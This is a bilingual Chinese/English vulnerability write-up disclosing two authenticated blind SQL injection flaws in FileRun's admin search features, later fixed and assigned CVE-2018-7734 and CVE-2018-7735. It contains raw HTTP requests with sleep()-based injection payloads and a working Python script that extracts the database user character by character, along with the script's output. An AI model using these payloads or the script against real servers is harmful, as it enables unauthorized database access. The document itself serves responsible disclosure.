---
layout: post
title: FileRun <= 2017.09.25 Blind SQLi
categories: articles
---

<p align="right" class="date">{{ page.date | date_to_string }} - scanf</p>

## 0x00 Preface

&nbsp;&nbsp;&nbsp;在内部分享中需要用到私有的云盘服务,一番寻找之后发现FileRun是个不错的应用程序.FileRun允许我们自己搭建云存储，方便我们的照片，视频等文件更好的分享和存储.
&nbsp;&nbsp;&nbsp;Sometimes team private file sharing need use file sharing web application.I noticed FileRun is a great application,This application allows us to access our files anywhere through self-hosted secure cloud storage.

## 0x01 How To Find The Vulnerability

&nbsp;&nbsp;&nbsp;需要我们以`superuser`登录后台

These vulnerabilitys was found after the authentication. After we logged in as `superuser`.

### SQL1

控制面板——>Admin——>用户——>快速搜索,这样将会发送一个POST请求。

go to control panel——>Admin——>user——>search,will generate a POST request to the server.

{% highlight javascript %}
POST /?module=users&section=cpanel&page=list HTTP/1.1
Host: target.com
Content-Length: 20
Origin: http://target.com
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
Referer: http://target.com/?module=cpanel&_popup_id=popups_1
Accept-Language: zh-CN,zh;q=0.9
Cookie: __cfduid=d7455062d8788785c8b64d8dfef5a7f041513411013; language=chinese; FileRunSID=e578cd49697ef564ed0979bde9d67dcf
Connection: close

limit=50&search=aaaa
{% endhighlight %}

我注意到search参数容易受到SQL注入的影响,通过传入aaaa' 服务器返回了一个500的响应状态:

I notice that the search parameter might be vulnerable to SQL Injection,I injected a single quote after the value (example:aaaa'),examined the server response error:

然后构造了基于sleep函数延时的payload:

Use MySQL's delay function sleep () to testing.

<img src="https://i.loli.net/2018/11/30/5c01504c70061.png">

{% highlight javascript %}
'xor(sleep(5))or'
{% endhighlight %}

结果如下

<img src="https://i.loli.net/2018/11/30/5c015098123ba.png">

然后使用Blind SQL注入技术来获取select user()数据验证脚本如下：

Here I create a simple script to extract current select user()query result using Boolean-based technique.

{% highlight python %}

#!/usr/bin/env python
# -*- coding:utf-8 -*-
#__author__ = 'scanf'
import httplib
import time

headers = {'Content-Type': 'application/x-www-form-urlencoded',
           'User-Agent': 'Googlebot/2.1 (+http://www.googlebot.com/bot.html)',
           'Cookie': '__cfduid=d7455062d8788785c8b64d8dfef5a7f041513411013; language=chinese; FileRunSID=e578cd49697ef564ed0979bde9d67dcf',
           #'Cookie' : 'input you cookie',
           }
payloads = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.*'
print '[%s] Start to retrive MySQL User:' % time.strftime('%H:%M:%S', time.localtime())
user = ''
for i in range(1, 15):
        for payload in payloads:
            s = "aaaa'xor(if(ascii(mid(user()from(%s)for(1)))=%s,1,0))or'" % (i, ord(payload))
            s = '''limit=50&search=''' + s
            #url = http://target.com/?module=users&section=cpanel&page=list
            conn = httplib.HTTPConnection('target.com', timeout=30)
            conn.request(method='POST', url='/?module=users&section=cpanel&page=list', body=s,headers=headers)
            start_time = time.time()
            html_doc = conn.getresponse().read()
            conn.close()
            print '.',
            if html_doc.find('uid') > 0:
                user += payload
                print '\n[in progress]', user,
                break
print '\n[Done] MySQL user is %s' % user

{% endhighlight %}

{% highlight javascript %}
[20:39:20] Start to retrive MySQL User:
. . . . . . 
[in progress] f . . . . . . . . . 
[in progress] fi . . . . . . . . . . . . 
[in progress] fil . . . . . 
[in progress] file . . . . . . . . . . . . . . . . . . 
[in progress] filer . . . . . . . . . . . . . . . . . . . . . 
[in progress] fileru . . . . . . . . . . . . . . 
[in progress] filerun . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
[in progress] filerun@ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
[in progress] filerun@1 . . .
{% endhighlight %}

### SQL2

控制面板——>元数据——>快速搜索,输入字符串后将发起一个POST请求:

control panel——>Metadata——>search Same as SQL1,will generate a POST request to the server:

{% highlight javascript %}
POST /?module=metadata&section=cpanel&page=list_filetypes HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: http://target.com/?module=cpanel&_popup_id=popups_1
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 36
Cookie: __cfduid=df5ddd49a2303cb2e13b6aa8ece2af7b11513411363; FileRunSID=fa163cd088b68ae20c689826e3a70479; language=chinese
Connection: close

limit=50&search=aaa'xor(sleep(2))or'
{% endhighlight %}

然后超时后响应:

sleep() function is executed:

<img src="https://i.loli.net/2018/11/30/5c0150d5f182e.png">

## timeline

* 2017.12.18 发现漏洞并联系官方 Discover the vulnerability and contact the official
* 2017.12.22 等待官方处理 Waiting for official processing
* 2018.2.13 官方修复2.13并致谢并允许公开 Officially fixed 2.13 and thanks and open for publication
* 2018.3.6 请求cve漏洞编号 Request cve
* 2018.3.7 获得CVE-2018-7734 CVE-2018-7735

cve information：

http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7734
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7735